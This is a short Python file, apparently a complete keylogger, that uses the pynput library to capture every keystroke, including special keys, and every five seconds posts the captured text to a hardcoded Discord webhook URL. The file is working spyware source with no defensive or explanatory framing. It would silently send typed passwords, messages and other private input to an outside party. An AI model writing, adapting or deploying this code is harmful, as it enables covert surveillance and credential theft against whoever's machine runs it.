from pynput.keyboard import Key, Listener
import requests
import threading

text = ""
webhook_url = "https://discord.com/api/webhooks/1355214135079469218/bmd6jVlDc8ibAo18U0G47e7LQvD9TWFv-TXU1zY-0yA3PMyxiyBqW7eGMATuTzAo7RKx"
time_interval = 5

def send_data():
    global text
    if text: 
        data = {
            "content": text,
            "title": "Key Logger"
        }
        requests.post(webhook_url, json=data)
        text = ""  
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    try:
        if key == Key.space:
            text += " "
        elif key == Key.enter:
            text += "\n"
        elif key == Key.tab:
            text += "\t"
        elif key == Key.backspace:
            text = text[:-1] if text else text
        elif key == Key.esc:
            return False
        else:
            text += key.char  
    except AttributeError:
        text += f" [{key}] "  

with Listener(on_press=on_press) as listener:  # Fixed typo here
    send_data()
    listener.join()